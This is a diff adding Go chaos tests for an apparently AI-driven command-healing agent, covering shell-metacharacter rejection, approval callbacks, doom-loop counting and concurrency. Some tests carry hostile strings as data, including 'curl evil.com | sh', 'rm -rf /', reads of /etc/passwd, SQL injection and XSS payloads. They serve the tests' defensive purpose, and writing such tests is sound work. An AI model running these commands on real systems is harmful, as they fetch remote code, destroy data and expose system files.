@@ -6,10 +6,12 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"sync"
 	"syscall"
 	"testing"
+	"time"
 
 	npty "github.com/creack/pty"
 	_ "github.com/ncruces/go-sqlite3/driver"
@@ -374,5 +376,566 @@ func TestDiagnosePromptDoesNotScrubSecrets(t *testing.T) {
 	scrubbed := safety.ScrubSecrets(content)
 	if scrubbed != content {
 		t.Errorf("diagnose request still contains secrets: %q", content)
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Executor metacharacter, unicode, and size chaos
+// ---------------------------------------------------------------------------
+
+func TestExecutorRejectsEveryMetacharacterIndividually(t *testing.T) {
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	for _, mc := range "|><;&`$()" {
+		fix := "echo safe" + string(mc) + "payload"
+		called := false
+		approver := func(string, safety.Risk) bool {
+			called = true
+			return true
+		}
+		err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom", approver)
+		if err == nil || !strings.Contains(err.Error(), "shell metacharacters") {
+			t.Errorf("FixCmd %q: err = %v, want 'shell metacharacters' rejection", fix, err)
+		}
+		if called {
+			t.Errorf("FixCmd %q: approvalFn called despite metacharacter %q", fix, string(mc))
+		}
+	}
+}
+
+func TestExecutorUnicodeMetacharLookalikesPassThrough(t *testing.T) {
+	// Full-width Unicode lookalikes (U+FF01–U+FF5E block) are NOT shell
+	// metacharacters: the executor's ASCII-only check lets them through, and
+	// since fixes are exec'd directly (never through a shell) they remain inert
+	// literal characters. This documents that behaviour explicitly.
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	lookalikes := map[rune]string{
+		'｜': "fullwidth vertical bar",
+		'＜': "fullwidth less-than",
+		'＞': "fullwidth greater-than",
+		'＆': "fullwidth ampersand",
+		'；': "fullwidth semicolon",
+		'｀': "fullwidth grave accent",
+		'＄': "fullwidth dollar",
+		'（': "fullwidth left paren",
+		'）': "fullwidth right paren",
+	}
+	for r, name := range lookalikes {
+		fix := "echo lookalike" + string(r) + "text"
+		called := false
+		approver := func(string, safety.Risk) bool {
+			called = true
+			return false // reject so no harness run is needed
+		}
+		err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom", approver)
+		if err != nil {
+			t.Errorf("%s (U+%04X) in %q: err = %v, want pass-through (not a shell metacharacter)", name, r, fix, err)
+		}
+		if !called {
+			t.Errorf("%s (U+%04X) in %q: approvalFn not consulted; lookalike wrongly rejected", name, r, fix)
+		}
+	}
+}
+
+func TestExecutorWhitespaceOnlyFixCommands(t *testing.T) {
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	whitespaceOnly := []string{"", "   ", "\t", "\n", "\t \n ", " \u00a0\u3000 ", "\r\n"}
+	for _, fix := range whitespaceOnly {
+		err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom",
+			func(string, safety.Risk) bool { return true })
+		if err == nil || !strings.Contains(err.Error(), "fix command is empty") {
+			t.Errorf("FixCmd %q: err = %v, want 'fix command is empty'", fix, err)
+		}
+	}
+}
+
+func TestExecutorNullBytesInFixCmd(t *testing.T) {
+	defer stdinTTY(t)()
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	fix := "echo\x00rm -rf /"
+
+	// Rejected fix: no exec attempted, no crash.
+	if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom",
+		func(string, safety.Risk) bool { return false }); err != nil {
+		t.Fatalf("Execute(rejected NUL fix) = %v, want nil", err)
+	}
+
+	// Approved fix: the NUL-embedded binary name must fail cleanly, not panic.
+	err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: fix}, "boom",
+		func(string, safety.Risk) bool { return true })
+	if err == nil {
+		t.Fatal("Execute(approved NUL fix) returned nil error, want exec failure")
+	}
+}
+
+func TestExecutorFixCmd10000Chars(t *testing.T) {
+	defer stdinTTY(t)()
+	executor := NewExecutor(pty.NewHarness(1<<20, 512*1024), llm.NewRouter(), newTestStore(t))
+	long := "echo " + strings.Repeat("x", 10000)
+
+	if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: long}, "boom",
+		func(string, safety.Risk) bool { return false }); err != nil {
+		t.Fatalf("Execute(rejected 10k-char fix) = %v, want nil", err)
+	}
+
+	if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: long}, "boom",
+		func(string, safety.Risk) bool { return true }); err != nil {
+		t.Fatalf("Execute(approved 10k-char fix) = %v", err)
+	}
+}
+
+func TestExecutorApprovalFnPanicsRecoverable(t *testing.T) {
+	executor := NewExecutor(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	panicker := func(string, safety.Risk) bool { panic("approval exploded") }
+
+	func() {
+		defer func() {
+			if r := recover(); r == nil {
+				t.Fatal("approvalFn panic was not recoverable")
+			} else if r != "approval exploded" {
+				t.Fatalf("recovered %v, want 'approval exploded'", r)
+			}
+		}()
+		_ = executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: "echo ok"}, "boom", panicker)
+	}()
+
+	// The executor must remain usable after the panic.
+	calls := 0
+	if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: "echo ok"}, "boom",
+		func(string, safety.Risk) bool { calls++; return false }); err != nil {
+		t.Fatalf("Execute after panic: %v", err)
+	}
+	if calls != 1 {
+		t.Fatalf("approvalFn called %d times after panic, want 1", calls)
+	}
+}
+
+func TestExecutorApprovalFnCalledExactlyOnce(t *testing.T) {
+	defer stdinTTY(t)()
+	executor := NewExecutor(pty.NewHarness(1<<20, 512*1024), llm.NewRouter(), newTestStore(t))
+
+	t.Run("approved run consults approvalFn exactly once", func(t *testing.T) {
+		calls := 0
+		if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: "echo ok"}, "boom",
+			func(string, safety.Risk) bool { calls++; return true }); err != nil {
+			t.Fatalf("Execute: %v", err)
+		}
+		if calls != 1 {
+			t.Fatalf("approvalFn called %d times, want exactly 1", calls)
+		}
+	})
+
+	t.Run("rejected run consults approvalFn exactly once", func(t *testing.T) {
+		calls := 0
+		if err := executor.Execute(context.Background(), &models.HealSuggestion{FixCmd: "echo ok"}, "boom",
+			func(string, safety.Risk) bool { calls++; return false }); err != nil {
+			t.Fatalf("Execute: %v", err)
+		}
+		if calls != 1 {
+			t.Fatalf("approvalFn called %d times on rejection, want exactly 1", calls)
+		}
+	})
+}
+
+// ---------------------------------------------------------------------------
+// Doom loop fingerprinting, reset, and concurrency
+// ---------------------------------------------------------------------------
+
+func TestDoomLoopFingerprintCollisionImmunity(t *testing.T) {
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	stdout := []byte("byte-identical output for both commands")
+
+	// Worst-case "collision": identical stdout means identical hash prefix.
+	// The raw command is part of the fingerprint, so the commands stay apart.
+	fpA := doomFingerprint("command A", stdout)
+	fpB := doomFingerprint("command B", stdout)
+	if fpA == fpB {
+		t.Fatalf("colliding fingerprints even though raws differ: %q", fpA)
+	}
+
+	// Counts must not bleed between the two keys.
+	a.doomMu.Lock()
+	a.doomLoopCounts[fpA] = 3
+	a.doomLoopCounts[fpB] = 1
+	a.doomMu.Unlock()
+	if a.doomLoopCounts[fpA] != 3 || a.doomLoopCounts[fpB] != 1 {
+		t.Fatalf("counts bled across fingerprint keys: %+v", a.doomLoopCounts)
+	}
+}
+
+func TestDoomLoopResetsOnSuccess(t *testing.T) {
+	defer stdinTTY(t)()
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	counter := filepath.Join(t.TempDir(), "doom-counter")
+	cmd := "n=$(cat " + counter + " 2>/dev/null || echo 0); echo boom; echo $((n+1)) > " + counter +
+		"; if [ $((n%2)) -eq 0 ]; then exit 1; else exit 0; fi"
+	args := []string{"sh", "-c", cmd}
+	ctx := context.Background()
+	opts := RunOptions{SkipPermissions: true}
+
+	run := func() *RunResult {
+		t.Helper()
+		res, err := a.Run(ctx, args, opts)
+		if err != nil {
+			t.Fatalf("Run: %v", err)
+		}
+		return res
+	}
+
+	first := run() // n=0 → fails
+	if first.DoomLoopCount != 1 {
+		t.Fatalf("first failure DoomLoopCount = %d, want 1", first.DoomLoopCount)
+	}
+	second := run() // n=1 → succeeds → must clear the fingerprint
+	if second.ExitCode != 0 {
+		t.Fatalf("second run exit = %d, want 0", second.ExitCode)
+	}
+	third := run() // n=2 → fails again → count must restart at 1, not carry 2
+	if third.ExitCode != 1 || third.DoomLoopCount != 1 {
+		t.Fatalf("third run = exit %d DoomLoopCount %d, want exit 1 count 1 (reset on success)", third.ExitCode, third.DoomLoopCount)
+	}
+
+	a.doomMu.Lock()
+	defer a.doomMu.Unlock()
+	for key, count := range a.doomLoopCounts {
+		if count != 1 {
+			t.Errorf("fingerprint %q holds count %d, want 1 after successful reset", key, count)
+		}
+	}
+}
+
+func TestDoomLoopConcurrentUpdates(t *testing.T) {
+	defer stdinTTY(t)()
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	ctx := context.Background()
+	opts := RunOptions{SkipPermissions: true}
+	const groups = 5
+	const perGroup = 3
+
+	var wg sync.WaitGroup
+	errs := make(chan error, groups)
+	for g := 0; g < groups; g++ {
+		wg.Add(1)
+		go func(g int) {
+			defer wg.Done()
+			cmd := fmt.Sprintf("sh -c echo group-%d; exit 1", g)
+			args := []string{"sh", "-c", fmt.Sprintf("echo group-%d; exit 1", g)}
+			for i := 0; i < perGroup; i++ {
+				res, err := a.Run(ctx, args, opts)
+				if err != nil {
+					errs <- fmt.Errorf("group %d run %d: %w", g, i, err)
+					return
+				}
+				if res == nil || res.ExitCode != 1 {
+					errs <- fmt.Errorf("group %d run %d: result %+v, want exit 1", g, i, res)
+					return
+				}
+			}
+			_ = cmd
+		}(g)
+	}
+	wg.Wait()
+	close(errs)
+	for err := range errs {
+		t.Fatalf("concurrent doom loop error: %v", err)
+	}
+
+	a.doomMu.Lock()
+	defer a.doomMu.Unlock()
+	if len(a.doomLoopCounts) != groups {
+		t.Fatalf("doomLoopCounts has %d keys, want %d distinct groups", len(a.doomLoopCounts), groups)
+	}
+	for key, count := range a.doomLoopCounts {
+		if count != perGroup {
+			t.Errorf("fingerprint %q count = %d, want %d (no cross-group bleed)", key, count, perGroup)
+		}
+	}
+}
+
+func TestDoomLoopFingerprintEmptyAndWhitespaceOutput(t *testing.T) {
+	cases := []struct {
+		raw      string
+		stdout   string
+		otherRaw string
+		otherOut string
+	}{
+		{"cmd", "", "cmd", " "},
+		{"cmd", "   ", "cmd", "\t"},
+		{"cmd", "", "other", ""},
+		{"cmd", " \n\t ", "cmd", "\n\n"},
+	}
+	for i, c := range cases {
+		fpA := doomFingerprint(c.raw, []byte(c.stdout))
+		fpB := doomFingerprint(c.otherRaw, []byte(c.otherOut))
+		if fpA == "" {
+			t.Fatalf("case %d: empty fingerprint", i)
+		}
+		if fpA == fpB {
+			t.Errorf("case %d: fingerprints %q equal for distinct raw/stdout, want distinct", i, fpA)
+		}
+	}
+}
+
+// ---------------------------------------------------------------------------
+// Agent integration chaos (Ask + Run)
+// ---------------------------------------------------------------------------
+
+func TestAskLargeInput(t *testing.T) {
+	rec := &recordingProvider{resp: "done"}
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadHeal, rec)
+	router.Register(llm.WorkloadLearn, rec)
+	a := New(pty.NewHarness(0, 512*1024), router, newTestStore(t))
+
+	input := strings.Repeat("a", 100*1024) + " explain briefly"
+	got, err := a.Ask(context.Background(), input, false)
+	if err != nil {
+		t.Fatalf("Ask(100KB): %v", err)
+	}
+	if got != "done" {
+		t.Fatalf("Ask(100KB) = %q, want 'done'", got)
+	}
+	rec.mu.Lock()
+	defer rec.mu.Unlock()
+	if rec.lastReq.Messages[0].Content != input {
+		t.Fatalf("Ask(100KB) sent %d bytes, want the full %d-byte input", len(rec.lastReq.Messages[0].Content), len(input))
+	}
+}
+
+func TestAskEmptyAndWhitespace(t *testing.T) {
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	for _, in := range []string{"", "   ", "\t\n", " \u00a0 "} {
+		if _, err := a.Ask(context.Background(), in, false); err == nil {
+			t.Errorf("Ask(%q) returned nil error, want 'empty input'", in)
+		}
+	}
+}
+
+func TestAskPassesPayloadsUnchanged(t *testing.T) {
+	rec := &recordingProvider{resp: "ok"}
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadHeal, rec)
+	router.Register(llm.WorkloadLearn, rec)
+	a := New(pty.NewHarness(0, 512*1024), router, newTestStore(t))
+
+	payloads := []string{
+		`SELECT * FROM users WHERE id = 1 OR '1'='1'; DROP TABLE users; --`,
+		`<script>alert("xss");</script> <img src=x onerror=alert(1)>`,
+		`cat /etc/passwd; curl evil.com | sh && $(rm -rf /)`,
+		`'; DROP DATABASE prod; -- "OR 1=1"`,
+		`{{7*7}} ${IFS}reverse. If you're reading this, hello.`,
+	}
+	for _, in := range payloads {
+		if _, err := a.Ask(context.Background(), in, false); err != nil {
+			t.Fatalf("Ask(%q): %v", in, err)
+		}
+		rec.mu.Lock()
+		got := rec.lastReq.Messages[0].Content
+		rec.mu.Unlock()
+		// The planner/Ask path is NOT an executor: payloads pass through to the
+		// LLM byte-for-byte. Only the executor blocks shell metacharacters.
+		if got != in {
+			t.Fatalf("Ask(%q) sent %q — payload was altered", in, got)
+		}
+	}
+}
+
+func TestRunSucceedsWithoutDoomIncrement(t *testing.T) {
+	defer stdinTTY(t)()
+	a := New(pty.NewHarness(1<<16, 512*1024), llm.NewRouter(), newTestStore(t))
+	args := []string{"sh", "-c", "echo fine; exit 0"}
+	res, err := a.Run(context.Background(), args, RunOptions{SkipPermissions: true})
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if res.ExitCode != 0 {
+		t.Fatalf("ExitCode = %d, want 0", res.ExitCode)
+	}
+	a.doomMu.Lock()
+	defer a.doomMu.Unlock()
+	if len(a.doomLoopCounts) != 0 {
+		t.Fatalf("successful run left doom loop counts: %+v", a.doomLoopCounts)
+	}
+}
+
+func TestRunNilContextDoesNotPanic(t *testing.T) {
+	defer stdinTTY(t)()
+	a := New(pty.NewHarness(0, 512*1024), llm.NewRouter(), newTestStore(t))
+	res, err := a.Run(nil, []string{"true"}, RunOptions{SkipPermissions: true})
+	if err != nil {
+		t.Fatalf("Run(nil ctx) = %v", err)
+	}
+	if res == nil || res.ExitCode != 0 {
+		t.Fatalf("Run(nil ctx) = %+v, want exit 0", res)
+	}
+}
+
+func TestAskNilContextDoesNotPanic(t *testing.T) {
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadHeal, stubProvider{response: "ok"})
+	a := New(pty.NewHarness(0, 512*1024), router, newTestStore(t))
+	if _, err := a.Ask(nil, "hello", false); err != nil {
+		t.Fatalf("Ask(nil ctx) = %v", err)
+	}
+}
+
+func TestRunPlannerNilSuggestionHandled(t *testing.T) {
+	defer stdinTTY(t)()
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadDiagnose, stubProvider{response: "I am afraid I cannot fix this"})
+	a := New(pty.NewHarness(0, 512*1024), router, newTestStore(t))
+	args := []string{"sh", "-c", "echo breaking; exit 1"}
+	res, err := a.Run(context.Background(), args, RunOptions{SkipPermissions: true})
+	if err != nil {
+		t.Fatalf("Run: %v", err)
+	}
+	if res.Healed {
+		t.Fatal("Run healed a command whose planner returned a nil suggestion")
+	}
+	if res.DoomLoopCount != 1 {
+		t.Fatalf("DoomLoopCount = %d, want 1", res.DoomLoopCount)
+	}
+}
+
+func TestRunApprovalFnPanicRecoverable(t *testing.T) {
+	defer stdinTTY(t)()
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadDiagnose, stubProvider{response: "FIX: echo fixed\nEXPLANATION: x"})
+	a := New(pty.NewHarness(0, 512*1024), router, newTestStore(t))
+	args := []string{"sh", "-c", "echo failing; exit 1"}
+
+	func() {
+		defer func() {
+			if r := recover(); r == nil {
+				t.Fatal("Run with panicking ApprovalFn did not panic")
+			} else if r != "user exploded" {
+				t.Fatalf("recovered %v, want 'user exploded'", r)
+			}
+		}()
+		_, _ = a.Run(context.Background(), args, RunOptions{
+			SkipPermissions: true,
+			ApprovalFn:      func(string, safety.Risk) bool { panic("user exploded") },
+		})
+	}()
+}
+
+// ---------------------------------------------------------------------------
+// Full pipeline chaos (real harness + real SQLite + mock LLM)
+// ---------------------------------------------------------------------------
+
+type pipelineOpts struct {
+	approve bool
+}
+
+func newPipelineAgent(t *testing.T, resp string) *Agent {
+	t.Helper()
+	router := llm.NewRouter()
+	router.Register(llm.WorkloadDiagnose, stubProvider{response: resp})
+	store, err := memory.New(filepath.Join(t.TempDir(), "pipeline.db"))
+	if err != nil {
+		t.Fatalf("memory.New: %v", err)
+	}
+	t.Cleanup(func() { _ = store.Close() })
+	return New(pty.NewHarness(1<<20, 512*1024), router, store)
+}
+
+func TestPipelineConcurrentHealRuns(t *testing.T) {
+	defer stdinTTY(t)()
+	a := newPipelineAgent(t, "FIX: echo fixed\nEXPLANATION: x")
+	ctx := context.Background()
+	opts := RunOptions{SkipPermissions: true, ApprovalFn: func(string, safety.Risk) bool { return false }}
+
+	var wg sync.WaitGroup
+	errs := make(chan error, 20)
+	for i := 0; i < 20; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			args := []string{"sh", "-c", fmt.Sprintf("echo pipeline-%d; exit 1", i)}
+			for j := 0; j < 3; j++ {
+				res, err := a.Run(ctx, args, opts)
+				if err != nil {
+					errs <- fmt.Errorf("pipeline-%d run %d: %w", i, j, err)
+					return
+				}
+				if res == nil || res.ExitCode != 1 {
+					errs <- fmt.Errorf("pipeline-%d run %d: result %+v, want exit 1", i, j, res)
+					return
+				}
+			}
+		}(i)
+	}
+	wg.Wait()
+	close(errs)
+	for err := range errs {
+		t.Fatalf("pipeline concurrent run error: %v", err)
+	}
+}
+
+func TestPipelineAlternatingSuccessAndFailure(t *testing.T) {
+	defer stdinTTY(t)()
+	a := newPipelineAgent(t, "FIX: echo fixed\nEXPLANATION: x")
+	counter := filepath.Join(t.TempDir(), "alt-counter")
+	cmd := "n=$(cat " + counter + " 2>/dev/null || echo 0); echo boom; echo $((n+1)) > " + counter +
+		"; if [ $((n%2)) -eq 0 ]; then exit 1; else exit 0; fi"
+	args := []string{"sh", "-c", cmd}
+	ctx := context.Background()
+	opts := RunOptions{SkipPermissions: true, ApprovalFn: func(string, safety.Risk) bool { return false }}
+
+	// After a successful interleave the doom count must restart fresh, so the
+	// healing-loop guard must never trip across 6 alternating attempts.
+	for i := 0; i < 6; i++ {
+		res, err := a.Run(ctx, args, opts)
+		if err != nil {
+			t.Fatalf("attempt %d: %v", i+1, err)
+		}
+		wantExit := 1 - (i % 2)
+		switch {
+		case wantExit == 1 && (res.ExitCode != 1 || res.DoomLoopCount != 1):
+			t.Fatalf("attempt %d: exit %d count %d, want failure with fresh count 1", i+1, res.ExitCode, res.DoomLoopCount)
+		case wantExit == 0 && res.ExitCode != 0:
+			t.Fatalf("attempt %d: exit %d, want success 0", i+1, res.ExitCode)
+		}
+	}
+}
+
+func TestPipelineNoGoroutineLeaks(t *testing.T) {
+	restore := stdinTTY(t)
+	a := newPipelineAgent(t, "FIX: echo fixed\nEXPLANATION: x")
+	ctx := context.Background()
+	opts := RunOptions{SkipPermissions: true, ApprovalFn: func(string, safety.Risk) bool { return false }}
+
+	// Warm the harness once so any one-time runtime goroutines exist before the
+	// baseline is taken.
+	if _, err := a.Run(ctx, []string{"true"}, opts); err != nil {
+		t.Fatalf("warm Run: %v", err)
+	}
+	base := runtime.NumGoroutine()
+
+	counter := filepath.Join(t.TempDir(), "leak-counter")
+	cmd := "n=$(cat " + counter + " 2>/dev/null || echo 0); echo boom; echo $((n+1)) > " + counter +
+		"; if [ $((n%2)) -eq 0 ]; then exit 1; else exit 0; fi"
+	args := []string{"sh", "-c", cmd}
+	for i := 0; i < 10; i++ {
+		if _, err := a.Run(ctx, args, opts); err != nil {
+			t.Fatalf("burst run %d: %v", i, err)
+		}
+	}
+
+	restore() // stdin → /dev/null lets every stdout tee + stdin pump drain
+
+	// Poll for the min goroutine count once the pumps have wound down.
+	minObserved := runtime.NumGoroutine()
+	deadline := time.Now().Add(3 * time.Second)
+	for time.Now().Before(deadline) {
+		time.Sleep(25 * time.Millisecond)
+		if g := runtime.NumGoroutine(); g < minObserved {
+			minObserved = g
+			if g <= base+1 {
+				break
+			}
+		}
+	}
+	if minObserved > base+2 {
+		t.Fatalf("goroutine leak: baseline %d, minimum after drain %d", base, minObserved)
 	}
 }
